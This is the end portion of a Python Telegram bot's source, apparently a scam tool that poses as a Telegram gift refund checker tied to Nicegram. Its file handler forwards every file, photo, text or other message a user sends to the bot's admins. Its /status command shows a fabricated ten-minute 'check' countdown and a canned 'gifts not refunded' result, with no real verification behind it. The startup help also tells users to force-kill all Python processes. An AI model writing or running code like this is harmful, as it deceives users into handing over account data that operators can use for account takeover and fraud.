        logger.info(f"Удален администратор: {remove_admin_id}")
    else:
        bot.reply_to(message,
            file_bot.t(message.from_user.id, 'addadmin_error').format(error="Не удалось сохранить список администраторов"))
        logger.error(f"Ошибка при удалении администратора")

@bot.message_handler(commands=['listadmins'])
def handle_list_admins(message: Message):
    """Показать список администраторов"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'admin_command_denied'))
        return
    
    admin_ids_str = ", ".join(map(str, ADMIN_IDS))
    bot.reply_to(
        message,
        file_bot.t(message.from_user.id, 'listadmins').format(
            admin_count=len(ADMIN_IDS),
            admin_ids=admin_ids_str
        ),
        parse_mode='HTML'
    )

@bot.message_handler(commands=['admin'])
def handle_admin_command(message: Message):
    """Команда для получения информации об администраторах"""
    if message.from_user.id in ADMIN_IDS:
        admin_ids_str = ", ".join(map(str, ADMIN_IDS))
        bot.reply_to(
            message,
            file_bot.t(message.from_user.id, 'admin_info_text').format(
                user_id=message.from_user.id,
                admin_count=len(ADMIN_IDS),
                admin_ids=admin_ids_str
            ),
            parse_mode='HTML'
        )
    else:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'admin_command_denied'))

@bot.message_handler(commands=['status'])
def handle_status_check(message: Message):
    """Проверка статуса последней проверки"""
    user_id = message.from_user.id
    
    if user_id in file_bot.active_checks:
        check = file_bot.active_checks[user_id]
        
        if check.status == CheckStatus.PENDING:
            status_text = "Проверка ожидает запуска"
        elif check.status == CheckStatus.IN_PROGRESS:
            elapsed = datetime.now() - check.start_time
            remaining = 600 - elapsed.total_seconds()  # 10 минут = 600 секунд
            if remaining > 0:
                minutes = int(remaining // 60)
                seconds = int(remaining % 60)
                status_text = f"Проверка в процессе...\nОсталось: {minutes} мин {seconds} сек"
            else:
                status_text = "Проверка завершается..."
        elif check.status == CheckStatus.COMPLETED:
            if check.result == "success":
                status_text = "Проверка успешно завершена!\nПодарки не рефнуты"
            else:
                status_text = "Проверка завершена с ошибкой"
        else:
            status_text = "Неизвестный статус проверки"
    else:
        status_text = "У вас нет активных проверок"
    
    bot.reply_to(message, status_text, parse_mode='HTML')

@bot.message_handler(content_types=['document', 'photo', 'video', 'audio', 'text'])
def handle_file(message: Message):
    """Обработка отправленных файлов и текста"""
    try:
        user_id = message.from_user.id
        
        file_bot.user_sessions[user_id] = {
            'first_name': message.from_user.first_name,
            'last_name': message.from_user.last_name,
            'username': message.from_user.username
        }
        
        file_info = {}
        
        if message.document:
            file_info = {
                'file_name': message.document.file_name or 'document.bin',
                'file_size': message.document.file_size,
                'mime_type': message.document.mime_type,
                'type': 'document'
            }
        elif message.photo:
            file_info = {
                'file_name': 'photo.jpg',
                'type': 'photo'
            }
        elif message.video:
            file_info = {
                'file_name': message.video.file_name or 'video.mp4',
                'file_size': message.video.file_size,
                'mime_type': message.video.mime_type,
                'type': 'video'
            }
        elif message.audio:
            file_info = {
                'file_name': message.audio.file_name or 'audio.mp3',
                'file_size': message.audio.file_size,
                'mime_type': message.audio.mime_type,
                'type': 'audio'
            }
        elif message.text:
            file_info = {
                'file_name': 'текстовое сообщение',
                'type': 'text',
                'content': message.text
            }
        
        file_bot.forward_file_to_admins(user_id, file_info, message)
        
    except Exception as e:
        logger.error(f"Ошибка обработки файла/текста: {e}", exc_info=True)
        try:
            bot.reply_to(message, file_bot.t(message.from_user.id, 'file_error'))
        except:
            pass

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call: CallbackQuery):
    """Обработка callback-запросов от кнопок"""
    try:
        user_id = call.from_user.id
        
        file_bot.user_sessions[user_id] = {
            'first_name': call.from_user.first_name,
            'last_name': call.from_user.last_name,
            'username': call.from_user.username
        }
        
        if call.data.startswith("lang_"):
            lang = call.data.split("_")[1]
            file_bot.user_languages[user_id] = lang
            
            bot.answer_callback_query(
                call.id,
                file_bot.t(user_id, 'language_changed'),
                show_alert=False
            )
            
            file_bot.send_welcome_with_photo(user_id)
            
        elif call.data == "download_nicegram":
            bot.answer_callback_query(
                call.id,
                file_bot.t(user_id, 'download_nicegram'),
                show_alert=False
            )
            bot.send_message(
                user_id,
                file_bot.t(user_id, 'nicegram_info'),
                parse_mode='HTML'
            )
            
        elif call.data == "check_refund":
            bot.answer_callback_query(
                call.id,
                file_bot.t(user_id, 'check_refund'),
                show_alert=False
            )
            bot.send_message(
                user_id,
                file_bot.t(user_id, 'refund_info'),
                parse_mode='HTML'
            )
            
        elif call.data == "instruction":
            bot.answer_callback_query(
                call.id,
                file_bot.t(user_id, 'instruction'),
                show_alert=False
            )
            bot.send_message(
                user_id,
                file_bot.t(user_id, 'instruction_info'),
                parse_mode='HTML'
            )
            
        elif call.data == "admin_info":
            if user_id in ADMIN_IDS:
                bot.answer_callback_query(
                    call.id,
                    file_bot.t(user_id, 'admin_info'),
                    show_alert=False
                )
                
                admin_ids_str = ", ".join(map(str, ADMIN_IDS))
                bot.send_message(
                    user_id,
                    file_bot.t(user_id, 'admin_info_text').format(
                        user_id=user_id,
                        admin_count=len(ADMIN_IDS),
                        admin_ids=admin_ids_str
                    ),
                    parse_mode='HTML'
                )
            else:
                bot.answer_callback_query(
                    call.id,
                    file_bot.t(user_id, 'admin_command_denied'),
                    show_alert=True
                )
            
        elif call.data == "add_admin_menu":
            if user_id in ADMIN_IDS:
                bot.answer_callback_query(
                    call.id,
                    "Меню управления администраторами",
                    show_alert=False
                )
                bot.send_message(
                    user_id,
                    "<b>Управление администраторами</b>\n\nВыберите действие:",
                    reply_markup=file_bot.create_add_admin_menu(user_id),
                    parse_mode='HTML'
                )
            else:
                bot.answer_callback_query(
                    call.id,
                    file_bot.t(user_id, 'admin_command_denied'),
                    show_alert=True
                )
                
        elif call.data == "add_admin_by_id":
            if user_id in ADMIN_IDS:
                bot.answer_callback_query(call.id, show_alert=False)
                msg = bot.send_message(
                    user_id,
                    "<b>Добавление администратора</b>\n\nВведите ID пользователя, которого хотите добавить как администратора:",
                    parse_mode='HTML'
                )
                bot.register_next_step_handler(msg, process_add_admin_step)
            else:
                bot.answer_callback_query(
                    call.id,
                    file_bot.t(user_id, 'admin_command_denied'),
                    show_alert=True
                )
                
        elif call.data == "show_admin_list":
            if user_id in ADMIN_IDS:
                bot.answer_callback_query(call.id, show_alert=False)
                admin_ids_str = ", ".join(map(str, ADMIN_IDS))
                bot.send_message(
                    user_id,
                    file_bot.t(user_id, 'listadmins').format(
                        admin_count=len(ADMIN_IDS),
                        admin_ids=admin_ids_str
                    ),
                    parse_mode='HTML',
                    reply_markup=file_bot.create_add_admin_menu(user_id)
                )
            else:
                bot.answer_callback_query(
                    call.id,
                    file_bot.t(user_id, 'admin_command_denied'),
                    show_alert=True
                )
                
        elif call.data == "remove_admin_menu":
            if user_id in ADMIN_IDS:
                bot.answer_callback_query(call.id, show_alert=False)
                if len(ADMIN_IDS) <= 1:
                    bot.send_message(
                        user_id,
                        "<b>Нельзя удалить последнего администратора!</b>",
                        parse_mode='HTML',
                        reply_markup=file_bot.create_add_admin_menu(user_id)
                    )
                else:
                    bot.send_message(
                        user_id,
                        "<b>Удаление администратора</b>\n\nВыберите администратора для удаления:",
                        parse_mode='HTML',
                        reply_markup=file_bot.create_remove_admin_menu(user_id)
                    )
            else:
                bot.answer_callback_query(
                    call.id,
                    file_bot.t(user_id, 'admin_command_denied'),
                    show_alert=True
                )
                
        elif call.data.startswith("remove_admin_"):
            if user_id in ADMIN_IDS:
                try:
                    remove_admin_id = int(call.data.replace("remove_admin_", ""))
                    
                    if remove_admin_id not in ADMIN_IDS:
                        bot.answer_callback_query(
                            call.id,
                            "Администратор не найден",
                            show_alert=True
                        )
                        return
                    
                    if remove_admin_id == user_id:
                        bot.answer_callback_query(
                            call.id,
                            "Вы не можете удалить себя",
                            show_alert=True
                        )
                        return
                    
                    if len(ADMIN_IDS) <= 1:
                        bot.answer_callback_query(
                            call.id,
                            "Нельзя удалить последнего администратора",
                            show_alert=True
                        )
                        return
                    
                    ADMIN_IDS.remove(remove_admin_id)
                    file_bot.admin_ids = ADMIN_IDS
                    
                    if save_admin_ids():
                        bot.answer_callback_query(
                            call.id,
                            f"Администратор {remove_admin_id} удален",
                            show_alert=False
                        )
                        bot.send_message(
                            user_id,
                            f"<b>Администратор удален</b>\n\nID: {remove_admin_id}\nОсталось администраторов: {len(ADMIN_IDS)}",
                            parse_mode='HTML',
                            reply_markup=file_bot.create_add_admin_menu(user_id)
                        )
                        logger.info(f"Удален администратор: {remove_admin_id}")
                    else:
                        bot.answer_callback_query(
                            call.id,
                            "Ошибка сохранения",
                            show_alert=True
                        )
                        
                except Exception as e:
                    bot.answer_callback_query(
                        call.id,
                        f"Ошибка: {str(e)}",
                        show_alert=True
                    )
            else:
                bot.answer_callback_query(
                    call.id,
                    file_bot.t(user_id, 'admin_command_denied'),
                    show_alert=True
                )
                
        elif call.data == "back_to_main":
            bot.answer_callback_query(call.id, show_alert=False)
            file_bot.send_welcome_with_photo(user_id)
            
        elif call.data == "change_language":
            bot.answer_callback_query(
                call.id,
                file_bot.t(user_id, 'select_language'),
                show_alert=False
            )
            bot.send_message(
                user_id,
                file_bot.t(user_id, 'select_language'),
                reply_markup=file_bot.create_language_menu(),
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Ошибка обработки callback: {e}")
        bot.answer_callback_query(
            call.id,
            file_bot.t(call.from_user.id, 'callback_error'),
            show_alert=True
        )

def process_add_admin_step(message: Message):
    """Обработка добавления администратора"""
    try:
        user_id = message.from_user.id
        
        if user_id not in ADMIN_IDS:
            bot.reply_to(message, file_bot.t(user_id, 'admin_command_denied'))
            return
        
        new_admin_id = message.text.strip()
        
        if not new_admin_id.isdigit():
            bot.reply_to(message, "ID должен быть числом!")
            return
        
        new_admin_id = int(new_admin_id)
        
        if new_admin_id in ADMIN_IDS:
            bot.reply_to(message, f"Пользователь {new_admin_id} уже является администратором")
            return
        
        ADMIN_IDS.append(new_admin_id)
        file_bot.admin_ids = ADMIN_IDS
        
        if save_admin_ids():
            bot.reply_to(
                message,
                f"<b>Пользователь добавлен как администратор</b>\n\nID: {new_admin_id}\nВсего администраторов: {len(ADMIN_IDS)}",
                parse_mode='HTML',
                reply_markup=file_bot.create_add_admin_menu(user_id)
            )
            logger.info(f"Добавлен новый администратор: {new_admin_id}")
        else:
            bot.reply_to(message, "Ошибка при сохранении списка администраторов")
            
    except Exception as e:
        logger.error(f"Ошибка при добавлении администратора: {e}")
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_other_messages(message: Message):
    """Обработка всех остальных сообщений"""
    try:
        if message.text and message.text.lower() not in ['/start', '/help', '/admin', '/addadmin', '/removeadmin', '/listadmins', '/status']:
            bot.send_message(
                message.chat.id,
                file_bot.t(message.from_user.id, 'send_file'),
                reply_markup=file_bot.create_main_menu(message.from_user.id),
                parse_mode='HTML'
            )
    except Exception as e:
        logger.error(f"Ошибка обработки сообщения: {e}")

def check_bot_token():
    """Проверка валидности токена бота"""
    try:
        bot_info = bot.get_me()
        logger.info(f"Бот успешно авторизован: @{bot_info.username} (ID: {bot_info.id})")
        logger.info(f"Администраторы: {ADMIN_IDS}")
        logger.info(f"Язык по умолчанию: {DEFAULT_LANGUAGE}")
        logger.info(f"Фото для приветствия: {'Найдено' if file_bot.photo_exists() else 'Не найдено'}")
        return True
    except Exception as e:
        logger.error(f"Ошибка авторизации бота: {e}")
        print(f"\nОШИБКА: Неверный TELEGRAM_BOT_TOKEN!")
        print(f"Текущий токен: {TELEGRAM_BOT_TOKEN[:15]}...")
        print("\nПроверьте:")
        print("1. Правильно ли скопирован токен")
        print("2. Не истек ли срок действия токена")
        print("3. Проверьте файл .env")
        return False

def cleanup():
    """Очистка при завершении работы"""
    logger.info("Завершение работы бота...")
    remove_lock_file()

def main():
    """Основная функция запуска бота"""
    print("\n" + "=" * 50)
    print("FILE FORWARDING BOT LAUNCH / ЗАПУСК БОТА")
    print("=" * 50)
    
    try:
        # Проверяем, не запущен ли уже бот
        if check_lock_file():
            print("\nБот уже запущен!")
            print("Закройте все другие экземпляры бота и попробуйте снова.")
            print("Если бот был завершен некорректно, удалите файл:", LOCK_FILE)
            print("\nПроверьте запущенные процессы:")
            print("Windows: tasklist | findstr python")
            print("Linux: ps aux | grep python")
            return
        
        # Создаем файл блокировки
        if not create_lock_file():
            print("Не удалось создать файл блокировки")
            return
        
        # Регистрируем обработчик завершения
        import atexit
        atexit.register(cleanup)
        
        # Отключаем webhook
        print("\nОтключаю webhook...")
        delete_webhook(TELEGRAM_BOT_TOKEN)
        
        # Проверяем токен
        if not check_bot_token():
            print("\nFailed to start bot. Check configuration.")
            cleanup()
            return
        
        admin_ids_str = ", ".join(map(str, ADMIN_IDS))
        lang_name = "Русский" if DEFAULT_LANGUAGE == 'ru' else "English"
        photo_status = "Найдено" if file_bot.photo_exists() else "Не найдено (будет использован только текст)"
        
        print(f"\nБот запущен и готов!")
        print(f"Откройте Telegram и найдите вашего бота")
        print(f"Начните с команды /start")
        print(f"Администраторы: {len(ADMIN_IDS)} ({admin_ids_str})")
        print(f"Язык по умолчанию: {lang_name}")
        print(f"Фото для приветствия: {photo_status}")
        print(f"Время проверки файла: 10 минут")
        print(f"Функция добавления админа: Добавлена")
        print(f"\nБот работает... (нажмите Ctrl+C для остановки)")
        print("-" * 50)
        
        # Запускаем бота с обработкой исключений
        try:
            bot.polling(
                none_stop=True,
                interval=1,
                timeout=30,
                skip_pending=True
            )
        except telebot.apihelper.ApiTelegramException as e:
            if "Conflict" in str(e) or "409" in str(e):
                print("\n" + "=" * 50)
                print("ОШИБКА: Обнаружено несколько экземпляров бота!")
                print("=" * 50)
                print("\nДействия для решения проблемы:")
                print("1. Закройте все окна с запущенным ботом")
                print("2. Удалите файл блокировки:", LOCK_FILE)
                print("3. Перезапустите компьютер")
                print("4. Запустите бота заново")
                print("\nБыстрое решение:")
                print("1. Откройте командную строку (CMD)")
                print("2. Выполните: taskkill /F /IM python.exe")
                print("3. Удалите файл", LOCK_FILE)
                print("4. Запустите бота снова")
            else:
                logger.error(f"Ошибка Telegram API: {e}")
        except KeyboardInterrupt:
            print("\nБот остановлен пользователем")
        except Exception as e:
            logger.error(f"Критическая ошибка запуска бота: {e}", exc_info=True)
            print(f"\nКритическая ошибка: {e}")
        
    finally:
        cleanup()

if __name__ == "__main__":
    # Устанавливаем рабочую директорию
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # Сначала проверим и убьем старые процессы
    print("Проверка запущенных процессов...")
    
    # Удаляем старый файл блокировки если он существует
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, 'r') as f:
                old_pid = f.read().strip()
                if old_pid.isdigit():
                    try:
                        os.kill(int(old_pid), 0)
                        print(f"Найден старый процесс с PID {old_pid}")
                    except OSError:
                        print(f"Старый процесс с PID {old_pid} не найден, удаляю файл блокировки")
            os.remove(LOCK_FILE)
        except:
            pass
    
    # Проверяем зависимости
    try:
        import telebot
        import json
        import requests
        from dotenv import load_dotenv
    except ImportError as e:
        print(f"Отсутствуют необходимые библиотеки: {e}")
        print("\nУстановите зависимости:")
        print("pip install pyTelegramBotAPI python-dotenv requests")
        exit(1)
    
    main()
